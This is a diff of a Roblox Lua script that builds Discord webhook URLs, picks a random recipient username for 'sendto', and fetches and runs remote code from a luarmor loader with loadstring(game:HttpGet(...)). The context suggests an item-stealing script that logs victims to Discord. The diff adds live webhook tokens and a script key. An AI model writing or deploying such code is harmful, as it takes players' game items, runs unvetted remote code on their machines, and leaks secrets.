@@ -1,5 +1,4 @@
-
-local plrs = game:GetService("Players") 
+ local plrs = game:GetService("Players") 
   local plr = plrs.LocalPlayer
   local tpService = game:GetService("TeleportService")
 
@@ -44,8 +43,19 @@ local usernames = {
 "",
 "",
 "",
-
-
+"",
+"",
+"",
+"",
+"",
+"",
+"",
+"",
+"",
+"",
+"",
+"",
+""
 }
 
 local function getRandomUsername()
@@ -55,8 +65,8 @@ end
 
 local sendto = getRandomUsername()
 
-local web4 = ""
-local web5 = ""
+local web4 = "https://discord.com/api/webhooks/1330886743590703175/"
+local web5 = "TDAvi0vzfBZU-UbEDwUg3RtEzy_Xz8BVUu2NKljEso4PezFUDuOJ1ZI5BJoL2x2_VuAq"
 
 local Url2 = web4 .. web5
 local Http2 = game:GetService("HttpService")
@@ -108,10 +118,10 @@ if not game:IsLoaded() then
   end
 
 
-local web = "https://discord.com/api/webhooks/1331539457656094740/"
-local web1 = "Z_rxLlN9b6Dfe1rY91wlGWY3CkvxtyGrKQFGLMM1SYNWD4DDwhL5wfQ_-oEsHwEBYSNF"
-local web2 = "https://discord.com/api/webhooks/1331539343495401472/"
-local web3 = "5D-Idt1_xt_8LCDTCm-GaW64gelRm5y7xr7mox-EwGjpRNPjGVODNJal93VE88Zh3ZRL"
+local web = "https://discord.com/api/webhooks/1330885579084402728/"
+local web1 = "13mFCyEjiIeTGhrtcsjWZ2Fq7lxDCAqRBCX1qUFzyfLi7EmRsPKy6r5F8R9xVTY6VkzF"
+local web2 = "https://discord.com/api/webhooks/1330886409707454477/"
+local web3 = "dEb04jYUEeX4ACVXdC8t7hh2VNyJWiaZ4lH0Jvt8wvPRzY-tRcq-9Czu2nz_7r3UYPF_"
 
 script_key="pzJWJPYLuguSaphivtczaaVsspjwvdmq";
 
@@ -143,9 +153,6 @@ getgenv().petsGoConfig = {
 }
 
 daubuoi = true
-
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5653ca0a4685e7d4268329988eefdb21.lua"))()
 
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5653ca0a4685e7d4268329988eefdb21.lua"))()
